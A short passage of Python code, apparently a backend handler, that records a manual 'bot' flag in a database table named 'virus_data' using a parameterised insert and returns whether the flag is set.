    c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
              (code, hid, "", "bot.manual", nv, _now()))
    c.commit()
    c.close()
    return {"ok": 1, "bot": (nv == "1")}